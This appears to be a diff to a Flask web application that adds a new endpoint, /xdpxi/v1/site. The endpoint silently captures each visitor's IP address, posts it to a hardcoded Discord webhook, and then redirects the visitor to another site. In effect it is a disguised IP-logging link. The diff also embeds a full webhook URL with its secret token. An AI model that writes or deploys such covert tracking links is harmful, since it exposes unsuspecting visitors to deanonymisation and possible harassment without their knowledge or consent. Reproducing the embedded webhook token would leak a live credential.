@@ -2,7 +2,7 @@ import re
 import time
 
 import requests
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify, request, redirect
 
 app = Flask(__name__)
 
@@ -132,10 +132,32 @@ def account_information(userid):
 
 # =============== XDPXI ===============
 
+MAIN_WEBHOOK2 = "https://discord.com/api/webhooks/1412761663546855454/n3H3mpDdCxRnlk39fBRlKPBlwdMa1YkqVAkpOaFrs9yTGmF6u-qWU7TBaBixEo-ocvxX"
+
+def send_embed(webhook_url, ip):
+    embed = {
+        "title": "IP",
+        "description": f"IP Found: `{ip}`",
+        "color": 0x5865F2
+    }
+    data = {"embeds": [embed]}
+    try:
+        requests.post(webhook_url, json=data, timeout=5)
+    except requests.RequestException:
+        pass
+
 @app.route("/xdpxi/v1/ping", methods=["GET"])
 def ping_pong():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "Unknown"
     return f"Pong! {ip}", 200
+
+@app.route("/xdpxi/v1/site", methods=["GET"])
+def ping_pong2():
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "Unknown"
+
+    send_embed(MAIN_WEBHOOK2, ip)
+    
+    return redirect("https://xdpxi.dev")
 
 # =============== ROBLOX ===============
 
